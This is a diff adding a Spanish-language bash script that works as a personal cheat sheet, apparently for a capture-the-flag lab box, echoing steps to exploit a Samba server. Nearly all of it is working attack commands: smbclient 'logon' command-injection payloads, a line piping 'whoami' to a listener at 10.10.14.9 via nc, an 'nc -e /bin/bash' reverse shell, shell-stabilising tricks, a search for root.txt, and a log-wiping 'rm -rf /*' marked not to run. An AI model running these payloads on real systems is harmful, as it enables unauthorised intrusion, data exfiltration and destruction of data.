@@ -1,0 +1,48 @@
+#!/bin/bash
+
+echo -e "\n\033[1;34mEste para ver los recursos disponibles:\033[0m"
+echo "smbclient -L //IP_name -U "
+echo -e "\n\033[1;34mPara entrar a por ejemplo /tmp :\033[0m"
+echo "smbclient  //10.10.10.3/tmp"
+echo -e "\n\033[1;33m_________________________________________________________\033[0m\n"
+echo -e "\n\033[1;34mPara ver un ping recibir en mi maquina kali:\033[0m"
+echo "sudo tcpdump -i tun0 icmp -n" 
+echo ""
+echo "ejecutar en la otra maquina esto:"
+echo 'logon "`nohup ping -c 1 10.10.14.9`"'
+#"`nohup ping -c 1 10.10.14.9`"
+echo -e "\n\033[1;31m_________________________________________________________\033[0m\n"
+
+echo -e "\n\033[1;34mPara recibir whoami en kali ejecuta nc:\033[0m"
+echo "nc -nlvp 443"
+echo ""
+echo "en la otra por ejemplo despues de entrar a smbclient  //10.10.10.3/tmp"
+echo "smb: \> "
+echo "logon \"\`nohup whoami | nc 10.10.14.9 443\`\""
+echo ""
+echo "de ahi modificar whoami por otro comando y reiniciar nc en escucha en cada comando"
+
+echo -e "\n\033[1;31m_________________________________________________________\033[0m\n"
+echo "Para obtener root bash "
+echo "smb: \>"
+echo ""
+echo 'logon "/=`nohup nc -e /bin/bash IP 443`"'
+#.    logon "/=`nohup nc -e /bin/bash 10.10.14.9 443`"
+echo ""
+echo "esto me da bash:   script /dev/null -c bash"
+
+echo "control z, regresar a mi terminal y escribir:"
+echo "A veces se traba en kitty, usar terminal en mac o konsole"
+echo "este comando arregla que control C no cierra mi consola"
+echo "stty raw -echo; fg"
+echo ""
+echo "para arreglar el tamano de la ventana nano ejemplo"
+echo "en otra ventana ejecutar  stty size"
+echo ""
+echo "regresar a la terminal de la maquina explotada"
+echo "stty rows 24 columns 80"
+echo "find / -name root.txt"
+
+echo ""
+echo "borrar logs y todo. NO EJECUTAR"
+echo "(rm -rf /*) 2>/dev/null"
